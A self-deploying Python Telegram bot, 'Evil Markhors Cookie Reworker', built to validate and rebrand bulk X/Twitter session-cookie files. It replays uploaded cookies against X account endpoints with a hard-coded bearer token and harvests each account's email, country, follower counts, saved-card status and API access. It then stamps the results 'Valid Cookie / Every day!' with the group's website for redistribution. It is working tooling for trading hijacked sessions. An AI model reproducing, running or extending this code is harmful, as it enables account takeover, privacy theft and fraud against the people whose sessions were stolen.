#!/usr/bin/env python3
"""
Evil Markhors Cookie Reworker - ALL-IN-ONE
Ek hi file. Pehli baar chalane pe baaki saari files khud bana deta hai.

Usage:
  python <file>.py --init     # sirf files banao (bot start nahi)
  python <file>.py            # files banao + bot chalao
"""
import os, re, sys, json, stat, asyncio, logging, tempfile, zipfile
from datetime import datetime

try:
    import httpx
    from telegram import Update, InputFile
    from telegram.ext import (ApplicationBuilder, CommandHandler,
                              MessageHandler, filters, ContextTypes)
except ImportError:
    print("Deps missing. Pehle chalao: pip install -r requirements.txt")
    raise

# ============================ CONFIG ============================
BOT_TOKEN    = os.getenv("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN")
WEBSITE      = os.getenv("WEBSITE", "https://evilmarkhors.me")
CREDIT       = os.getenv("CREDIT", "Config by Evil Markhors")
LIVE_DEFAULT = os.getenv("LIVE", "1") == "1"
CONCURRENCY  = int(os.getenv("CONCURRENCY", "8"))
TIMEOUT      = float(os.getenv("TIMEOUT", "25"))
MAX_FILES    = int(os.getenv("MAX_FILES", "5000"))
RETRIES      = int(os.getenv("RETRIES", "3"))
STORE_PATH   = os.getenv("STORE_PATH", "users.json")
HERE         = os.path.dirname(os.path.abspath(__file__))
SELF         = os.path.basename(os.path.abspath(__file__))   # apna naam khud pakadta hai

BEARER = ("AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
          "%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")

FIELDS = ["Username", "ID", "Followers", "Friends", "Posts", "Likes", "Media",
          "Verified", "Verified type", "Suspended", "Protected", "Country",
          "Year", "Created", "Email", "Phone", "2FA",
          "Card added", "API", "Developer API"]
_FIELD_RE = re.compile(r"^\s*[\u2013\-]\s*([^:]+?)\s*:\s*(.*)$")

# ============================ DEPLOY FILE TEMPLATES ============================
FILES = {}

FILES["requirements.txt"] = "python-telegram-bot>=21.0\nhttpx>=0.27\n"

FILES[".gitignore"] = "__pycache__/\n*.pyc\n.env\nusers.json\ndata/\nvenv/\n*.zip\n"

FILES[".env.example"] = (
    "BOT_TOKEN=123456:ABC_your_token\n"
    "LIVE=1\n"
    "CONCURRENCY=8\n"
    "WEBSITE=https://evilmarkhors.me\n"
    "CREDIT=Config by Evil Markhors\n"
    "STORE_PATH=users.json\n")

FILES["Dockerfile"] = (
    "FROM python:3.12-slim\n"
    "WORKDIR /app\n"
    "ENV PYTHONUNBUFFERED=1 STORE_PATH=/data/users.json\n"
    "COPY requirements.txt .\n"
    "RUN pip install --no-cache-dir -r requirements.txt\n"
    f"COPY {SELF} bot.py\n"
    "VOLUME [\"/data\"]\n"
    "CMD [\"python\", \"bot.py\"]\n")

FILES["docker-compose.yml"] = (
    "services:\n"
    "  bot:\n"
    "    build: .\n"
    "    restart: unless-stopped\n"
    "    environment:\n"
    "      - BOT_TOKEN=${BOT_TOKEN}\n"
    "      - LIVE=1\n"
    "      - CONCURRENCY=8\n"
    "      - WEBSITE=https://evilmarkhors.me\n"
    "      - CREDIT=Config by Evil Markhors\n"
    "      - STORE_PATH=/data/users.json\n"
    "    volumes:\n"
    "      - ./data:/data\n")

FILES["evilmarkhors-bot.service"] = (
    "[Unit]\n"
    "Description=Evil Markhors Cookie Reworker Bot\n"
    "After=network-online.target\n"
    "Wants=network-online.target\n\n"
    "[Service]\n"
    "Type=simple\n"
    "User=botuser\n"
    f"WorkingDirectory={HERE}\n"
    f"EnvironmentFile={HERE}/.env\n"
    f"ExecStart={HERE}/venv/bin/python {HERE}/{SELF}\n"
    "Restart=always\n"
    "RestartSec=5\n"
    "NoNewPrivileges=true\n"
    "PrivateTmp=true\n\n"
    "[Install]\n"
    "WantedBy=multi-user.target\n")

FILES["push.sh"] = (
    "#!/usr/bin/env bash\n"
    "set -e\n"
    "git add -A\n"
    "git commit -m \"update $(date +%F_%H:%M:%S)\" || echo 'kuch naya nahi'\n"
    "git push\n")

FILES["deploy.sh"] = (
    "#!/usr/bin/env bash\n"
    "set -e\n"
    f"cd {HERE}\n"
    "git pull --rebase\n"
    "venv/bin/pip install -q -r requirements.txt\n"
    "sudo systemctl restart evilmarkhors-bot\n"
    "echo \"deployed $(date)\"\n")

FILES["README.md"] = (
    "# Evil Markhors Cookie Reworker Bot\n\n"
    "Telegram bot: zip/single txt cookie files ko naye config mein convert karta hai.\n"
    f"Output header: `{WEBSITE}` + `{CREDIT}`\n\n"
    "## Run (VPS)\n"
    "```bash\n"
    "python3 -m venv venv && venv/bin/pip install -r requirements.txt\n"
    "cp .env.example .env   # BOT_TOKEN bharo\n"
    f"python {SELF}\n"
    "```\n\n"
    "## Docker\n"
    "```bash\n"
    "BOT_TOKEN=xxx docker compose up -d --build\n"
    "```\n\n"
    "## Commands\n"
    "/start /help /status /live on|off\n")

def write_file(path, content, overwrite=False):
    p = os.path.join(HERE, path)
    if os.path.exists(p) and not overwrite:
        return False
    with open(p, "w", encoding="utf-8") as f:
        f.write(content)
    if path.endswith(".sh"):
        os.chmod(p, os.stat(p).st_mode | stat.S_IEXEC | stat.S_IXGRP)
    return True

def bootstrap(force=False):
    made = []
    for name, content in FILES.items():
        if write_file(name, content, overwrite=force):
            made.append(name)
    return made

# ============================ PER-USER STORE ============================
_store, _store_lock = {}, asyncio.Lock()

def load_store():
    global _store
    try:
        with open(os.path.join(HERE, STORE_PATH), "r", encoding="utf-8") as f:
            _store = json.load(f)
    except Exception:
        _store = {}

def save_store():
    try:
        p = os.path.join(HERE, STORE_PATH)
        with open(p + ".tmp", "w", encoding="utf-8") as f:
            json.dump(_store, f, indent=2)
        os.replace(p + ".tmp", p)
    except Exception:
        logging.exception("store save failed")

def get_live(uid):
    return bool(_store.get(str(uid), {}).get("live", LIVE_DEFAULT))

async def set_live(uid, val):
    async with _store_lock:
        _store.setdefault(str(uid), {})["live"] = val
        save_store()

# ============================ PARSER / BUILDER ============================
def parse(text):
    data, cookies = {}, []
    for line in text.splitlines():
        m = _FIELD_RE.match(line)
        if m:
            data[m.group(1).strip()] = m.group(2).strip()
        elif "\t" in line and not line.lstrip().startswith("#"):
            cookies.append(line)
    return data, cookies

def cookie_dict(lines):
    d = {}
    for l in lines:
        p = l.split("\t")
        if len(p) >= 7:
            d[p[5]] = p[6]
    return d

def build(data, cookies):
    out = ["Valid Cookie  /  Every day!", WEBSITE, CREDIT, ""]
    for f in FIELDS:
        v = data.get(f)
        out.append(f"\u2013 {f}: {v if v not in (None, '') else '\u2013'}")
    out.append(f"\u2013 Cookies: {CREDIT}")
    out.append("")
    out.extend(cookies)
    return "\n".join(out).rstrip() + "\n"

# ============================ X API ============================
class XClient:
    def __init__(self, cookies):
        self.cookies = cookies
        self.headers = {
            "Authorization": f"Bearer {BEARER}",
            "x-csrf-token": cookies.get("ct0", ""),
            "x-twitter-active-user": "yes",
            "x-twitter-auth-type": "OAuth2Session",
            "x-twitter-client-language": "en",
            "User-Agent": UA, "Accept": "application/json"}

    async def get_json(self, client, url):
        delay = 1.0
        for _ in range(RETRIES):
            try:
                r = await client.get(url, headers=self.headers,
                                     cookies=self.cookies, timeout=TIMEOUT)
                if r.status_code in (429, 500, 502, 503):
                    await asyncio.sleep(delay); delay *= 2; continue
                return r.json() if r.status_code == 200 else None
            except Exception:
                await asyncio.sleep(delay); delay *= 2
        return None

def _year(s):
    m = re.search(r"(19|20)\d{2}", s or "")
    return m.group(0) if m else ""

async def live_check(client, cookies):
    xc = XClient(cookies); d = {}
    j = await xc.get_json(client,
        "https://api.x.com/1.1/account/verify_credentials.json"
        "?include_entities=false&skip_status=true&include_email=true")
    if j:
        d.update({"Username": j.get("screen_name", ""), "ID": j.get("id_str", ""),
                  "Followers": j.get("followers_count", ""),
                  "Friends": j.get("friends_count", ""),
                  "Posts": j.get("statuses_count", ""),
                  "Likes": j.get("favourites_count", ""),
                  "Media": j.get("media_count", ""),
                  "Verified": str(bool(j.get("verified"))).lower(),
                  "Verified type": j.get("verified_type") or "",
                  "Suspended": "false",
                  "Protected": str(bool(j.get("protected"))).lower(),
                  "Email": j.get("email", "")})
        if j.get("created_at"):
            d["Created"] = j["created_at"]
            y = _year(j["created_at"])
            if y: d["Year"] = y
    s = await xc.get_json(client, "https://api.x.com/1.1/account/settings.json")
    if s and s.get("country_code"):
        d["Country"] = s["country_code"]
    pm = await xc.get_json(client, "https://api.x.com/1.1/account/payment_methods.json")
    if isinstance(pm, dict) and "cards" in pm:
        d["Card added"] = "Yes" if pm.get("cards") else "No"
    fs = await xc.get_json(client, "https://api.x.com/1.1/account/feature_switches.json")
    if isinstance(fs, dict):
        if "has_api_access" in fs:
            d["API"] = str(bool(fs["has_api_access"])).lower()
        if "developer_api" in fs:
            d["Developer API"] = str(bool(fs["developer_api"])).lower()
    return d

async def rework(text, client, live, sem):
    data, cookies = parse(text)
    if live and cookies:
        async with sem:
            ld = await live_check(client, cookies)
        for k, v in ld.items():
            if v not in ("", None):
                data[k] = str(v)
    data["Cookies"] = CREDIT
    return build(data, cookies)

# ============================ ZIP ============================
async def process_zip(in_path, out_path, live, progress):
    ok = fail = 0
    sem = asyncio.Semaphore(CONCURRENCY)
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(in_path) as zin:
            names = [n for n in zin.namelist()
                     if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
            total = len(names)
            with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as zout:
                for i, name in enumerate(names, 1):
                    raw = b""
                    try:
                        raw = zin.read(name)
                        zout.writestr(name, await rework(
                            raw.decode("utf-8", "ignore"), client, live, sem))
                        ok += 1
                    except Exception:
                        logging.exception("failed: %s", name)
                        try: zout.writestr(name, raw)
                        except Exception: pass
                        fail += 1
                    await progress(i, total, ok, fail)
    return ok, fail, total

async def _safe_edit(msg, text):
    try: await msg.edit_text(text)
    except Exception: pass

# ============================ HANDLERS ============================
async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    await u.message.reply_text(
        "Evil Markhors Cookie Reworker\n\n"
        "Zip (500-1500 txt) ya single .txt bhejo.\n"
        f"Output: new config + {WEBSITE} + '{CREDIT}'\n\n"
        "/live on|off  /status  /help")

async def help_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    await u.message.reply_text(
        "1) .zip bhejo jismein cookie .txt hon\n"
        "2) Bot convert karke zip wapas bhejega\n"
        "3) /live off -> sirf format (fast)\n\nFields: " + ", ".join(FIELDS))

async def status_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    await u.message.reply_text(
        f"Live: {'ON' if get_live(u.effective_user.id) else 'OFF'}\n"
        f"Concurrency: {CONCURRENCY}\nWebsite: {WEBSITE}")

async def live_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    a = (c.args[0].lower() if c.args else "")
    new = True if a in ("on", "1", "yes") else False if a in ("off", "0", "no") else (not get_live(uid))
    await set_live(uid, new)
    await u.message.reply_text(f"Live ab {'ON' if new else 'OFF'} (saved).")

async def handle_txt(u: Update, c: ContextTypes.DEFAULT_TYPE, doc):
    msg = await u.message.reply_text("Process...")
    try:
        raw = await (await doc.get_file()).download_as_bytearray()
        sem = asyncio.Semaphore(CONCURRENCY)
        async with httpx.AsyncClient(follow_redirects=True) as client:
            new = await rework(raw.decode("utf-8", "ignore"), client,
                               get_live(u.effective_user.id), sem)
        await u.message.reply_document(
            InputFile(new.encode("utf-8"), filename=doc.file_name or "reworked.txt"),
            caption=f"Done - {WEBSITE}")
    except Exception as e:
        logging.exception("txt fail"); await u.message.reply_text(f"Error: {e}")
    finally:
        await _safe_edit(msg, "Complete.")

async def handle_zip(u: Update, c: ContextTypes.DEFAULT_TYPE, doc):
    msg = await u.message.reply_text("Download...")
    tmp = tempfile.mkdtemp(prefix="em_")
    ip, op = os.path.join(tmp, "in.zip"), os.path.join(tmp, "out.zip")
    try:
        await (await doc.get_file()).download_to_drive(ip)
        await _safe_edit(msg, "Processing...")
        last = [0.0]; loop = asyncio.get_event_loop()
        async def progress(i, total, ok, fail):
            if loop.time() - last[0] < 2 and i != total: return
            last[0] = loop.time()
            await _safe_edit(msg, f"Processing {i}/{total} | ok {ok} | fail {fail}")
        ok, fail, total = await process_zip(ip, op, get_live(u.effective_user.id), progress)
        if total == 0:
            await _safe_edit(msg, "Zip mein .txt nahi mila."); return
        await u.message.reply_document(InputFile(op, filename="evilmarkhors_reworked.zip"),
            caption=f"Done: {ok} updated, {fail} failed (total {total})\n{WEBSITE}\n{CREDIT}")
        await _safe_edit(msg, "Complete.")
    except Exception as e:
        logging.exception("zip fail"); await _safe_edit(msg, f"Error: {e}")
    finally:
        for p in (ip, op):
            try: os.remove(p)
            except Exception: pass
        try: os.rmdir(tmp)
        except Exception: pass

async def on_doc(u: Update, c: ContextTypes.DEFAULT_TYPE):
    n = (u.message.document.file_name or "").lower()
    if n.endswith(".zip"): await handle_zip(u, c, u.message.document)
    elif n.endswith(".txt"): await handle_txt(u, c, u.message.document)
    else: await u.message.reply_text("Sirf .zip ya .txt bhejo.")

# ============================ MAIN ============================
def main():
    made = bootstrap()
    if made:
        print("Bani files:", ", ".join(made))
        print("Pehli baar? -> cp .env.example .env  (BOT_TOKEN bharo)")
    if "--init" in sys.argv:
        return
    load_store()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("live", live_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, on_doc))
    logging.info("Bot chalu | live=%s", LIVE_DEFAULT)
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
